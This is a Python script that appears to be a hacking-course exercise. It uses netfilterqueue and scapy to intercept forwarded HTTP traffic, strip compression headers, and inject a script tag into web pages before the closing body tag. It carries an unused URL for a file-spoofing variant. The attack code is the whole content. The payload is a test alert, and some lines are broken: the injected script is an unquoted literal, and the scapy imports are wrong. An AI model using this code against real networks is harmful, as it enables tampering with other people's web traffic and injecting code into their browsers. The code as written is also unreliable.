import netfilterqueue
import pyptables
import scapy
import re


def main():
    # TODO make below an argparse input
    spoof_file = 'https://www.rarlab.com/rar/wrar56b1.exe'
    #setup_iptables()
    try:
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
    except KeyboardInterrupt:
        #TODO This may cause issues because except code isn't executing properly in my enviornment
        print('Resetting IP tables and exiting...')
        #flush_iptables()


def setup_iptables():
    table = pyptables.Table('filter')
    chain = table.chain('FORWARD')
    rule = pyptables.Rule()
    target = pyptables.Target('NFQUEUE')
    target.set_parameter('queue-num', '0')
    rule.target = target
    chain.insert_rule(rule, position=0)


def flush_iptables():
    table = pyptables.Table('filter')
    chain = table.chain('FORWARD')
    chain.flush()


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] HTML Request:")
            load = re.sub(r'Accept-Encoding:.*?\r\n', '', load)
        elif scapy_packet[scapy.TCP].sport == 80:
            print('[+] Response:')
            injection_code = <script>alert("test");</script>
            load = load.replace('</body>', f'{injection_code}</body>')
            content_length_search = re.search(r'Content-Length:\s(\d*)', load)
            if content_length_search:
                content_length = content_length_search.group(1)
                new_content_length = str(int(content_length) + len(injection_code))
                load = load.replace(content_length, new_content_length)
        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(bytes(new_packet))


    packet.accept()


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].len
    del packet[scapy.TCP].chksum
    return packet


if __name__ == '__main__':
    main()